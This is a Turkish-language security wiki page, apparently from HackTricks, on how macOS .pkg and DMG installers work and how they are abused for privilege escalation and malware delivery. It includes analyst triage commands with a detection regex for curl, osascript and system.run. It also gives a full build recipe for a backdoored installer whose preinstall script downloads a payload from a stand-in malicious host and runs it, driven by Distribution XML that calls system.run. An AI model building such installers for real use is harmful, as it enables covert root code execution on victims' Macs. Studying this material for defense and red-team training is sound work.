# macOS Installers Abuse

{{#include ../../../banners/hacktricks-training.md}}

## Pkg Temel Bilgileri

macOS **installer package** (aynı zamanda `.pkg` dosyası olarak da bilinir), macOS'un **yazılım dağıtmak** için kullandığı bir dosya formatıdır. Bu dosyalar, bir yazılım parçasının doğru şekilde yüklenip çalışması için ihtiyaç duyduğu her şeyi içeren bir **kutu** gibidir.

Paket dosyasının kendisi, **hedef** bilgisayara yüklenecek dosya ve dizinlerden oluşan bir **hiyerarşiyi** barındıran bir arşivdir. Ayrıca yapılandırma dosyalarını ayarlamak veya yazılımın eski sürümlerini temizlemek gibi yükleme öncesi ve sonrası görevleri gerçekleştirmek için **script'ler** de içerebilir.

### Hiyerarşi

<figure><img src="../../../images/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

- **Distribution (xml)**: Özelleştirmeler (başlık, karşılama metni…) ve script/yükleme kontrolleri
- **PackageInfo (xml)**: Bilgiler, yükleme gereksinimleri, yükleme konumu ve çalıştırılacak script'lerin yolları
- **Bill of materials (bom)**: Dosya izinleriyle birlikte yüklenecek, güncellenecek veya kaldırılacak dosyaların listesi
- **Payload (CPIO archive gzip compressed)**: PackageInfo içindeki `install-location` konumuna yüklenecek dosyalar
- **Scripts (CPIO archive gzip compressed)**: Yürütülmek üzere geçici bir dizine çıkarılan yükleme öncesi ve sonrası script'leri ile diğer kaynaklar

### Sıkıştırmayı Açma
```bash
# Tool to directly get the files inside a package
pkgutil --expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files in a more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
İçeriğini manuel olarak decompress etmeden görüntülemek için ücretsiz [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/) aracını da kullanabilirsiniz.

### Statik triage kısayolları

Amaç analysis ise paketi önce `Installer.app` ile açmaktan **kaçınmaya** çalışın. Bazı paketler, Installer onları açar açmaz code çalıştırabilir (örneğin `system.run()` veya installer plug-in'leri aracılığıyla); bu nedenle offline extraction genellikle daha güvenli bir başlangıçtır.
```bash
PKG="Suspicious.pkg"
OUT="/tmp/pkg-audit"

# Preserve Distribution, scripts, resources and nested component pkgs
pkgutil --expand-full "$PKG" "$OUT"

# Signature / policy checks
pkgutil --check-signature "$PKG"
spctl -a -vv -t install "$PKG"

# Quick hunting: scripts, BOM contents and interesting primitives
find "$OUT" -type f \( -name preinstall -o -name postinstall \) -print -exec head -n 1 {} \;
find "$OUT" -type f \( -name Bom -o -name '*.bom' \) -exec lsbom -pf {} \; 2>/dev/null
xmllint --format "$OUT/Distribution" 2>/dev/null | sed -n '1,200p'
rg -n 'system\.(run|runOnce)|<script>|launchctl|osascript|curl|chmod 4[0-7]{3}|sudo -u |\$USER|\$HOME|/tmp/|/var/tmp/' "$OUT"
```
## DMG Temel Bilgileri

DMG dosyaları veya Apple Disk Images, Apple'ın macOS işletim sistemi tarafından disk görüntüleri için kullanılan bir dosya formatıdır. Bir DMG dosyası esasen **mount edilebilir bir disk görüntüsüdür** (kendi dosya sistemini içerir) ve genellikle sıkıştırılmış, bazen de şifrelenmiş ham block verilerini barındırır. Bir DMG dosyasını açtığınızda macOS onu **fiziksel bir diskmiş gibi mount eder** ve içeriğine erişmenizi sağlar.

> [!CAUTION]
> **`.dmg`** installer'larının **çok fazla formatı** desteklediğini ve geçmişte bunlardan bazılarının içerdiği zafiyetlerin **kernel code execution** elde etmek için abuse edildiğini unutmayın.

### Hiyerarşi

<figure><img src="../../../images/image (225).png" alt=""><figcaption></figcaption></figure>

Bir DMG dosyasının hiyerarşisi içeriğe göre farklı olabilir. Ancak application DMG'leri için genellikle şu yapıyı izler:

- Top Level: Bu, disk görüntüsünün root dizinidir. Genellikle application'ı ve muhtemelen Applications klasörüne bir link içerir.
- Application (.app): Bu, gerçek application'dır. macOS'ta bir application genellikle application'ı oluşturan birçok ayrı dosya ve klasörü içeren bir package'tır.
- Applications Link: Bu, macOS'taki Applications klasörüne yönelik bir shortcut'tır. Bunun amacı application'ı yüklemenizi kolaylaştırmaktır. Application'ı yüklemek için .app dosyasını bu shortcut'ın üzerine sürükleyebilirsiniz.

## pkg abuse ile Privesc

### Public dizinlerden execution

Örneğin bir pre veya post installation script'i **`/var/tmp/Installerutil`** üzerinden çalışıyorsa ve bir attacker bu script'i kontrol edebiliyorsa, çalıştırıldığı her zaman privileges escalate edebilir. Veya benzer başka bir örnek:<sup>[1][3]</sup>

<figure><img src="../../../images/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

Bu, çeşitli installer'ların ve updater'ların **root olarak bir şey çalıştırmak** için çağırdığı bir [public function](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg)'dır. Bu function, parametre olarak **çalıştırılacak** **file**'ın **path**'ini kabul eder; ancak bir attacker bu file'ı **modify** edebilirse, root yetkileriyle çalıştırılmasını **abuse** ederek **privileges escalate** edebilir.
```bash
# Breakpoint in the function to check which file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this misconfig
```
Daha fazla bilgi için şu konuşmaya göz atın: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)<sup>[8]</sup>

### Environment ve shebang abuse

Modern PackageKit hataları, installer script'lerinin genellikle **trusted root code** olarak çalıştırıldığını ve aynı zamanda attacker-controlled context'i yakında tutmaya devam ettiğini gösterdi. Vendor package'lerini denetlerken özellikle şunlara dikkat edin:

- `#!/bin/zsh` / `#!/bin/bash` gibi Shell interpreter'ları
- `sudo -u $USER`, `launchctl asuser` gibi çağrılar veya `$USER`, `$HOME`, `PATH`, `TMPDIR` ya da relative path'lere güvenen herhangi bir mantık
- User-controlled init file'ları veya library'leri yükleyebilen non-shell interpreter'lar
```bash
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec sh -c 'printf "\n### %s\n" "$1"; head -n 1 "$1"' sh {} \;
rg -n '^#!/bin/(zsh|bash)|sudo -u |launchctl asuser|\$USER|\$HOME|PATH=|/usr/bin/env ' /tmp/target-pkg
```
2024 PackageKit root-environment bug'ı için (`~/.zshenv` / `~/.bash*` kullanıcı tarafından başlatılan install işlemleri sırasında miras alınıyor), [generic macOS privesc page](../macos-privilege-escalation.md) sayfasına bakın. Package **Apple-signed** ise aynı script bug'ı **SIP/TCC-relevant** hâle gelebilir; çünkü `system_installd`, `com.apple.rootless.install.heritable` taşıyabilir. [SIP page](../macos-security-protections/macos-sip.md) sayfasına bakın.<sup>[5][6]</sup>

### Mount ederek çalıştırma

Bir installer `/tmp/fixedname/bla/bla` yoluna yazıyorsa, `/tmp/fixedname` üzerine `noowners` ile bir **mount oluşturmak** mümkündür; böylece **installation sırasında herhangi bir dosyayı modify ederek** installation process'i abuse edebilirsiniz.

Buna örnek olarak, **root olarak execution** elde etmek için **periodic script'i overwrite etmeyi** başaran **CVE-2021-26089** verilebilir. Daha fazla bilgi için şu konuşmaya bakın: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)<sup>[7]</sup>

## pkg as malware

### Empty Payload

İçinde script'lerdeki malware dışında gerçek bir payload bulunmadan, yalnızca **pre ve post-install script'leri** içeren bir **`.pkg`** dosyası oluşturmak mümkündür.

### Distribution xml içinde JS

Package'ın **distribution xml** dosyasına **`<script>`** tag'leri eklemek mümkündür; bu kod çalıştırılır ve **`system.run`** kullanarak **commands execute edebilir**:

<figure><img src="../../../images/image (1043).png" alt=""><figcaption></figcaption></figure>

Distribution packages içinde bu genellikle, örneğin `allow-external-scripts="true"` ile top-level `Distribution` file'ın external scripts'i enable etmesine bağlıdır. Bu nedenle yalnızca `preinstall` / `postinstall`'ı review etmek yeterli değildir: **Distribution XML'in kendisi** `installation-check` / `volume-check` hook'larını ve doğrudan `system.run()` / `system.runOnce()` execution path'lerini içerebilir.
```bash
xmllint --format Distribution | sed -n '1,200p'
rg -n 'allow-external-scripts|system\.(run|runOnce)|installation-check|volume-check|function ' Distribution
```
### Backdoored Installer

dist.xml içinde bir script ve JS code kullanan kötü amaçlı installer
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options allow-external-scripts="true" customize="allow" require-scripts="true"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Build final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## Referanslar

- [1] [DEF CON 27 - Pkgs'leri Açmak: macOS Installer Packages İçine Bir Bakış ve Yaygın Güvenlik Açıkları](https://www.youtube.com/watch?v=iASSG0_zobQ)
- [2] [OBTS v4.0: "macOS Installer'larının Vahşi Dünyası" - Tony Lambert](https://www.youtube.com/watch?v=Eow5uNHtmIg)
- [3] [DEF CON 27 - Patrick Wardle - macOS Installer Packages'lerini Açmak](https://www.youtube.com/watch?v=kCXhIYtODBg)
- [4] [RedTeamRecipe - macOS Red Teaming: Installer Packages'lerini Exploit Etmek](https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages)
- [5] [CVE-2024-27822: macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [6] [Apple-signed Packages ile SIP'yi Kırmak](https://www.l3harris.com/newsroom/editorial/2024/03/breaking-sip-apple-signed-packages)
- [7] [OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl](https://www.youtube.com/watch?v=jSYPazD4VcE)
- [8] [DEF CON 25 - Patrick Wardle - macOS'ta 1000 Installer ile Ölüm; Her Şey Bozuk!](https://www.youtube.com/watch?v=lTOItyjTTkw)

{{#include ../../../banners/hacktricks-training.md}}
